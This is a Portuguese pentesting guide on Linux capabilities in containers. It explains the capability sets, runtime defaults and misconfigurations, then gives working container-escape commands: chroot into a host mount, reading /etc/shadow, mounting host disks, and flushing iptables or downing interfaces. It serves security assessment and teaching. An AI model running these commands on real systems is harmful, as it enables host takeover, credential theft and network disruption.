# Capacidades do Linux em containers

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

As capacidades do Linux são uma das partes mais importantes da segurança de containers porque respondem a uma pergunta sutil porém fundamental: **o que "root" realmente significa dentro de um container?** Em um sistema Linux normal, historicamente o UID 0 implicava um conjunto de privilégios muito amplo. Em kernels modernos, esse privilégio é decomposto em unidades menores chamadas capabilities. Um processo pode rodar como root e ainda assim não ter muitas operações poderosas se as capabilities relevantes tiverem sido removidas.

Containers dependem fortemente dessa distinção. Muitas cargas de trabalho ainda são iniciadas como UID 0 dentro do container por razões de compatibilidade ou simplicidade. Sem a remoção de capabilities, isso seria excessivamente perigoso. Com a remoção de capabilities, um processo root containerizado ainda pode realizar muitas tarefas comuns dentro do container enquanto lhe são negadas operações do kernel mais sensíveis. É por isso que um shell de container que mostra `uid=0(root)` não significa automaticamente "host root" ou mesmo "privilégio amplo no kernel". Os conjuntos de capabilities decidem quanto essa identidade root realmente vale.

Para a referência completa de Linux capabilities e muitos exemplos de abuso, veja:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Funcionamento

Capabilities are tracked in several sets, including permitted, effective, inheritable, ambient, and bounding sets. For many container assessments, the exact kernel semantics of each set are less immediately important than the final practical question: **which privileged operations can this process successfully perform right now, and which future privilege gains are still possible?**

A razão pela qual isso importa é que muitas técnicas de breakout são na verdade problemas de capabilities disfarçados de problemas de container. Uma carga de trabalho com `CAP_SYS_ADMIN` pode alcançar uma enorme quantidade de funcionalidade do kernel que um processo root de container normal não deveria tocar. Uma carga de trabalho com `CAP_NET_ADMIN` torna-se muito mais perigosa se também compartilhar o namespace de rede do host. Uma carga de trabalho com `CAP_SYS_PTRACE` torna-se muito mais interessante se puder ver processos do host através do compartilhamento de PID do host. No Docker ou Podman isso pode aparecer como `--pid=host`; no Kubernetes geralmente aparece como `hostPID: true`.

Em outras palavras, o conjunto de capabilities não pode ser avaliado isoladamente. Ele precisa ser lido em conjunto com namespaces, seccomp e política MAC.

## Laboratório

Uma forma muito direta de inspecionar capacidades dentro de um container é:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Você também pode comparar um container mais restrito com outro que tenha todas as capabilities adicionadas:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Para ver o efeito de uma adição mais restrita, tente remover tudo e adicionar de volta apenas uma capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Estas pequenas experiências ajudam a mostrar que um runtime não está simplesmente alternando um booleano chamado "privileged". Ele está moldando a superfície real de privilégios disponível para o processo.

## Capacidades de Alto Risco

Embora muitas capacidades possam importar dependendo do alvo, algumas aparecem repetidamente na análise de escape de contêiner.

**`CAP_SYS_ADMIN`** é aquela que os defensores devem tratar com maior suspeita. Frequentemente é descrita como "the new root" porque desbloqueia uma enorme quantidade de funcionalidade, incluindo operações relacionadas a mount, comportamento sensível a namespaces e muitos caminhos do kernel que nunca deveriam ser expostos casualmente a contêineres. Se um contêiner tem `CAP_SYS_ADMIN`, seccomp fraco e nenhuma forte confinamento MAC, muitos caminhos clássicos de breakout tornam-se muito mais realistas.

**`CAP_SYS_PTRACE`** importa quando existe visibilidade de processos, especialmente se o PID namespace é compartilhado com o host ou com workloads vizinhos interessantes. Pode transformar visibilidade em manipulação.

**`CAP_NET_ADMIN`** e **`CAP_NET_RAW`** importam em ambientes focados em rede. Em uma bridge network isolada eles já podem ser arriscados; em um host network namespace compartilhado são muito piores porque o workload pode ser capaz de reconfigurar a rede do host, sniffar, spoofar ou interferir nos fluxos de tráfego locais.

**`CAP_SYS_MODULE`** geralmente é catastrófica em um ambiente com root porque carregar módulos do kernel é efetivamente controle do kernel do host. Quase nunca deveria aparecer em um workload de contêiner de propósito geral.

## Uso do runtime

Docker, Podman, containerd-based stacks, e CRI-O todos usam controles de capabilities, mas os defaults e as interfaces de gerenciamento diferem. Docker os expõe diretamente através de flags como `--cap-drop` e `--cap-add`. Podman expõe controles similares e frequentemente se beneficia da execução rootless como uma camada adicional de segurança. Kubernetes expõe adições e drops de capabilities através do Pod ou do `securityContext` do container. Ambientes de system-container como LXC/Incus também dependem do controle de capabilities, mas a integração mais ampla com o host desses sistemas muitas vezes leva operadores a relaxar os defaults mais agressivamente do que fariam em um ambiente de app-container.

O mesmo princípio vale para todos eles: uma capability que é tecnicamente possível conceder não é necessariamente uma que deva ser concedida. Muitos incidentes do mundo real começam quando um operador adiciona uma capability simplesmente porque um workload falhou sob uma configuração mais restrita e a equipe precisou de um conserto rápido.

## Misconfigurações

O erro mais óbvio é **`--cap-add=ALL`** em CLIs estilo Docker/Podman, mas não é o único. Na prática, um problema mais comum é conceder uma ou duas capabilities extremamente poderosas, especialmente `CAP_SYS_ADMIN`, para "fazer a aplicação funcionar" sem também entender as implicações de namespace, seccomp e mounts. Outro modo comum de falha é combinar capabilities extras com compartilhamento de namespace do host. No Docker ou Podman isso pode aparecer como `--pid=host`, `--network=host`, ou `--userns=host`; no Kubernetes a exposição equivalente geralmente aparece através de configurações de workload como `hostPID: true` ou `hostNetwork: true`. Cada uma dessas combinações altera o que a capability pode realmente afetar.

Também é comum ver administradores acreditar que, porque um workload não é totalmente `--privileged`, ele ainda está significativamente contido. Às vezes isso é verdade, mas às vezes a postura efetiva já está próxima o suficiente de privileged que a distinção deixa de importar operacionalmente.

## Abuso

O primeiro passo prático é enumerar o conjunto efetivo de capabilities e imediatamente testar as ações específicas de cada capability que importariam para escape ou acesso a informações do host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Se `CAP_SYS_ADMIN` estiver presente, teste primeiro mount-based abuse e host filesystem access, porque este é um dos facilitadores de breakout mais comuns:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Se `CAP_SYS_PTRACE` estiver presente e o container puder ver processos interessantes, verifique se a capability pode ser transformada em inspeção de processos:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Se `CAP_NET_ADMIN` ou `CAP_NET_RAW` estiver presente, teste se a carga de trabalho pode manipular a pilha de rede visível ou ao menos coletar inteligência de rede útil:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Quando um teste de capability for bem-sucedido, combine-o com a situação do namespace. Uma capability que parece meramente arriscada em um namespace isolado pode tornar-se imediatamente um escape ou host-recon primitive quando o container também compartilha host PID, host network ou host mounts.

### Exemplo completo: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Se o container tiver `CAP_SYS_ADMIN` e um bind mount gravável do host filesystem, como `/host`, o caminho de escape costuma ser direto:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Se `chroot` for bem-sucedido, os comandos agora são executados no contexto do sistema de arquivos raiz do host:
```bash
id
hostname
cat /etc/shadow | head
```
Se `chroot` não estiver disponível, o mesmo resultado pode frequentemente ser obtido chamando o binário através da árvore montada:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Exemplo completo: `CAP_SYS_ADMIN` + Acesso ao dispositivo

Se um block device do host for exposto, `CAP_SYS_ADMIN` pode transformá-lo em acesso direto ao sistema de arquivos do host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Exemplo completo: `CAP_NET_ADMIN` + Host Networking

Esta combinação nem sempre produz host root diretamente, mas pode reconfigurar completamente a pilha de rede do host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Isso pode possibilitar denial of service, traffic interception ou acesso a serviços que anteriormente eram filtrados.

## Verificações

O objetivo das capability checks não é apenas fazer dump dos valores brutos, mas entender se o processo tem privilégios suficientes para tornar sua situação atual de namespace e mount perigosa.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
O que é interessante aqui:

- `capsh --print` é a maneira mais fácil de identificar capabilities de alto risco como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, ou `cap_sys_module`.
- A linha `CapEff` em `/proc/self/status` indica o que está efetivamente em vigor agora, não apenas o que pode estar disponível em outros conjuntos.
- Um dump de capabilities torna-se muito mais importante se o container também compartilhar host PID, network, ou user namespaces, ou tiver mounts do host graváveis.

Após coletar a informação bruta sobre capabilities, o próximo passo é a interpretação. Pergunte se o processo é root, se user namespaces estão ativos, se host namespaces são compartilhados, se seccomp está em modo enforcing, e se AppArmor ou SELinux ainda restringem o processo. Um capability set por si só é apenas parte da história, mas muitas vezes é a parte que explica por que um container breakout funciona e outro falha com o mesmo ponto de partida aparente.

## Padrões de runtime

| Runtime / platform | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Conjunto de capabilities reduzido por padrão | Docker mantém uma allowlist padrão de capabilities e remove as demais | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto de capabilities reduzido por padrão | Contêineres Podman não são privilegiados por padrão e usam um modelo de capabilities reduzido | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Herdam os padrões do runtime a menos que sejam alterados | Se nenhum `securityContext.capabilities` for especificado, o container recebe o default capability set do runtime | `securityContext.capabilities.add`, não remover `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Geralmente padrão do runtime | O conjunto efetivo depende do runtime mais o Pod spec | mesmo que a linha do Kubernetes; configuração direta OCI/CRI também pode adicionar capabilities explicitamente |

Para Kubernetes, o ponto importante é que a API não define um conjunto universal padrão de capabilities. Se o Pod não adicionar nem remover capabilities, a workload herda o padrão do runtime daquele nó.
{{#include ../../../../banners/hacktricks-training.md}}
